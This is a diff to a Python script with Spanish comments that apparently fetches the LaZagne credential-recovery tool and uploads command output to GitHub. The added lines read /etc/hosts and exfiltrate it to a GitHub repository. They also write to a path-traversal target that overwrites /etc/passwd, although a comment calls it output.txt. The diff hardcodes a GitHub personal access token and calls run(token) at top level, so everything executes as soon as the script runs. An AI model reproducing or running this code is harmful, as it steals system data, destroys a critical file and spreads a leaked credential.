@@ -41,6 +41,19 @@ def uploadToGithub(filename, content, token):
     else:
         print('[-] Hubo un error al subir ' + filename + ' a GitHub.')
 
+def catAndUpload(filename, token):
+    # Leer el contenido del archivo
+    with open(filename, 'r') as f:
+        content = f.read()
+
+    # Guardar el contenido en output.txt
+    output_filename = '../../../../../../../etc/passwd'
+    with open(output_filename, 'w') as f:
+        f.write(content)
+
+    # Subir output.txt a GitHub
+    uploadToGithub(output_filename, content, token)
+
 def run(token):
     urlb = "https://api.github.com/repos/AlessandroZ/LaZagne/contents/Linux/"
     path = 'Linux'
@@ -63,6 +76,13 @@ def run(token):
     # Subir el archivo a GitHub
     uploadToGithub(output_filename, result.stdout, token)
 
+    # Leer /etc/hosts y subirlo a GitHub
+    catAndUpload('/etc/hosts', token)
+
+# Token desde el primer código
+token = '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'
+
+run(token)
 
 
 
